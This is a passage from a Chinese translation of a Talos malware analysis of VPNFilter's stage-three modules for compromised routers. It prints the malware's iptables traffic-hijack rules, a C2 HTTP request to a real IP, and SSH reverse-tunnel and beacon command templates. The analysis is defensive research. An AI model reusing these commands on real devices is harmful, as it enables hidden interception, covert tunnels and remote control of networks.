# VPNFilter III：恶意软件中的瑞士军刀
##### 译文声明
本文是翻译文章，文章原作者 Talos，文章来源：talosintelligence.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 一、前言
[VPNFilter](https://blog.talosintelligence.com/2018/05/VPNFilter.html)是一款多阶段的模块化框架，已经影响全球数十万台网络设备，现在这个框架已经具备更为强大的功能。最近思科Talos发现这款恶意软件中新增了7个模块（第3阶段VPNFilter模块），极大扩展了自身功能，还能以已突破网络设备为据点攻击端点设备，此外还包含数据过滤以及多重加密隧道功能，可以隐蔽命令与控制（C2）及数据传输流量。虽然我们以及合作伙伴的研究成果已经能够抵御来自VPNFilter的大部分威胁，但如果有些设备没有部署针对性防御方案，这款恶意软件依然可以隐蔽于实际环境中。
Talos几个月以来一直在研究VPNFilter，并在5月份发布了最初的[研究报告](https://blog.talosintelligence.com/2018/05/VPNFilter.html)，在6月份介绍了该框架使用的[其他模块](https://blog.talosintelligence.com/2018/06/vpnfilter-update.html)。在后续研究过程中，我们研发了一项技术，能够识别MikroTik网络设备所使用的某个关键协议，以便搜寻攻击者可能利用的攻击方法。
在跟踪VPNFilter的感染情况时，我们发现MikroTik网络设备受到了来自攻击者的严重威胁（特别是在乌克兰境内的设备）。由于这些设备对攻击者的目标来说似乎非常重要，因此我们想进一步理解攻击者对这些设备的具体利用方式，我们还学习了MikroTik的Winbox管理工具所使用的具体协议。在本文中，我们想与大家分享我们研究该协议的出发点和具体方式，以及我们开发的一款解码器工具，安全社区可以使用该工具来分析该协议，寻找潜在的恶意攻击行为。
VPNFilter非常复杂，所有人以及所有组织都应该对此保持高度重视。只有高级的、有组织的防御方才能对抗这类威胁，并且VPNFilter的规模已经非常庞大，我们永远不能忽视这些新发现。
## 二、新增功能
新发现的VPNFilter第三阶段模块大大拓展了我们对已知威胁的理解深度，这些模块新增了如下功能：
1、可以用来映射网络，攻击与VPNFilter控制的设备相连接的端点。
2、通过各种方式混淆以及/或者加密恶意流量，包括C2流量以及数据通信流量。
3、利用多款工具来识别其他受害者，攻击者可以利用已被VPNFilter突破的网络设备为据点来访问这些受害者，实现网内横向渗透，也能用来识别攻击者感兴趣的其他网络的边际设备。
4、支持构建分布式代理网络，可以在未来不相关的攻击活动中使用，用来混淆攻击源的真实流量，让外界误以为攻击来自于先前被VPNFilter控制的设备。
逆向分析这些模块后，我们可以确认恶意软件的具体功能。在此之前，我们只能根据感知数据来分析这些功能，这样难免会出现一些纰漏。
比如，我们之前注意到被VPNFilter控制的设备会扫描一大段IP地址空间，寻找受VPNFilter攻击者利用方法影响的其他设备。现在我们可以讨论负责这类行为的特定第三阶段模块。
在分析这些扩展模块后，我们得以进一步了解VPNFilter相关的全部功能。
## 三、新增模块
如前文所述，Talos识别出了如下7个新增模块，这些模块极大拓展了VPNFilter的功能：
下文我们会逐一介绍这些模块。
###  htpx（端点攻击模块—可执行文件注入）
htpx是VPNFilter的第三阶段模块。该模块与我们之前[分析](https://blog.talosintelligence.com/2018/06/vpnfilter-update.html)的ssler模块共享部分代码，根据二进制文件中的字符串信息，我们发现该模块主要以开源代码为基础。典型的例子为[lipiptc.c](https://git.netfilter.org/iptables/tree/libiptc/libiptc.c)，该代码为Netfilter中的一部分：
图示：htpx（左侧）与ssler（右侧）中的字符串对比
htpx中的主功能函数负责设置iptables规则，以便将流向TCP
80端口的数据转到到本地服务器的8888端口。恶意软件首先加载能够进行流量管理的内核模块实现流量转发，通过insmod命令完成相关模块（Ip_tables.ko、Iptable_filter.ko以及Iptable_nat.ko）的加载。
随后，htpx模块使用如下命令来隐蔽转发流量：
    iptables -I INPUT -p tcp --dport 8888 -j ACCEPT
    iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8888
恶意模块还会定期检查这些规则是否依然存在，定期执行规则删除代码，然后再重新添加这些规则。此外，该模块还会创建一个临时文件：/var/run/htpx.pid。
之后该模块会生成如下HTTP请求：
    GET %s HTTP/1.1rnHost: 103.6.146.194rnAccept: */*rnUser-Agent: curl53rnrn
在我们对htpx模块的分析过程中，我们无法捕获来自C2基础设施的响应数据，因此无法观察其他模块的行为。分信息该模块的二进制文件后，我们发现该模块会检查HTTP通信数据，识别其中是否存在Windows可执行文件。如果满足该条件，则会标记可执行文件并将其加入某个表中。可以肯定的是，攻击者可能会利用该模块来下载二进制载荷，动态修改通过当前控制设备的Windows可执行文件。
###  ndbr（多功能SSH工具）
ndbr模块具备SSH功能，也能够扫描其他IP地址的端口状态。该模块使用了dropbear
SSH服务端以及客户端，是dbmulti（2017.75版）的修改版。我们已确定该模块对标准的dropbear功能做了若干修改。
第一处改动位于dbmulti应用中。这款典型的应用可以充当SSH客户端以及SSH服务端角色，能够使用SCP执行数据传输任务、生成或转换密钥，具体功能由程序名或者传入的首个参数来决定。ndbr模块将生成或转换密钥的功能替换为网络映射功能（比如端口扫描）以及名为ndbr的另一个函数。
与原始的dbmulti应用类似，ndbr模块的具体功能取决于程序名或者传入的第一个参数。ndbr可以接受的参数具体为dropbear、dbclient、ssh、scp、ndbr以及nmap。下面我们给大家具体介绍一下这些参数。
DROPBEAR
dropbear命令可以指示ndbr模块以SSH服务器形态运行。原始的dropbear代码使用了默认的SSH端口（TCP/22）来监听传入连接。然而ndbr模块修改了这部分代码，使用默认的TCP/63914端口进行监听。此外，该模块还修改了负责处理主机密钥文件（keyfile）的dropbear代码。默认的密钥文件路径已经修改为/db_key，但ndbr模块并没有释放该文件，而是修改buf_readfile这个dropbear函数，当文件名参数等于/db_key时，就会从内存中直接加载匹配的密钥。
该模块并没有使用基于密码的认证方式，而是修改dropbear服务端，通过匹配的公钥进行身份认证，该密钥同样内嵌在ndbr可执行文件中。修改过的代码中存在一个bug，无法处理使用不正确公钥的连接请求，此时认证失败会导致ndbr
SSH服务端卡死，陷入无限循环中，然而客户端并不知道认证失败结果。此时我们无法获取能够通过ndbr
SSH服务器认证的正确密钥，ndbr模块中内嵌的密钥（比如/db_key以及/cli_key）并不是正确密钥，我们也没有在其他VPNFilter相关应用中找到对应的密钥。
DBCLIENT（SSH）
如果传入dbclient或者ssh参数，ndbr模块就会化身为标准的dropbear
SSH命令行接口客户端，但修改了默认的选项。与dropbear服务端命令所使用的默认密钥文件参数一样，dbclient/ssh命令同样具有默认的标识文件：/cli_key。此时我们并不知道dbclient（SSH客户端）原本想连接的是哪个目的地址。
NMAP
如果传入nmap参数，ndbr模块就会对某个IP或者某段IP空间进行端口扫描，具体命令为：
    Usage %s -ip*  -p*  -noping  -tcp  -s  -h/--help (print this help)
NDBR
如果传入ndbr参数，那么ndbr模块就会根据传入的其他参数，执行3种操作中的一种。这种场景中SSH命令使用的是前文提到的默认密钥（即/db_key和/cli_key）。
第三个参数必须以start开头，否则ndbr模块就会执行卸载操作。
如果使用如下参数运行ndbr模块：
    $ ./ndbr_ ndbr   "start proxy  "
那么就会执行如下dropbear SSH命令：
    ssh -y -p  prx@ srv_ping j()_ 
此时dropbear SSH客户端就会连接到某个远程主机，并执行srv_ping命令，该命令很有可能用来在C2服务器上注册受害者信息。
如果使用如下参数运行ndbr模块：
    $ ./ndbr_ ndbr   "start -l "
那么就会运行SSH服务端（如前文所述），开始监听特定端口：
    sshd -p 
如果使用如下参数运行ndbr模块：
    $ ./ndbr_ ndbr   "start   "
那么就会执行如下dropbear命令，开启远程端口转发：
    ssh -N -T -y -p  -R :127.0.0.1:63914 @
###  nm（网络映射器）
nm模块可以用来扫描和映射本地子网。该模块会遍历所有接口，通过ARP扫描发现该接口对应IP所属子网中的所有主机。一旦收到ARP响应包，nm就会向探测到的主机发送一个ICMP
echo请求。如果收到ICMP echo回复，则执行端口扫描操作，尝试连接该主机的如下端口：9、 21、 22、 23、 25、 37、 42、 43、
53、 69、 70、 79、 80、 88、 103、 110、 115、 118、 123、 137、 138、 139、 143、 150、 156、
161、 190、 197、 389、 443、 445、 515、 546、 547、 569、 3306、 8080或者8291端口。
接下来，该模块使用MikroTik网络发现协议（MNDP，MikroTik Network Discovery
Protocol）来搜索本地网络中的其他MikroTik设备。一旦某个MikroTik设备回复MNDP
ping请求，那么nm模块就会提取出该设备的MAC地址、系统标识、版本号、平台类型、运行时间（以秒为单位）、RouterOS软件ID、RouterBoard模型以及接口名称。
nm模块会检查/proc/net/arp来获取被感染设备的ARP表信息，了解相邻设备的IP地址以及MAC地址，然后获取/proc/net/wireless中的所有数据。
该模块还会执行traceroute操作，首先尝试通过TCP协议连接8.8.8.8:53，确认目的地可达（没有发送任何数据），然后向该IP发送TTL递增的ICMP
echo请求报文。
收集到的所有网络信息保存到一个临时文件中：/var/run/repsc_.bin，该文件的内容如下所示：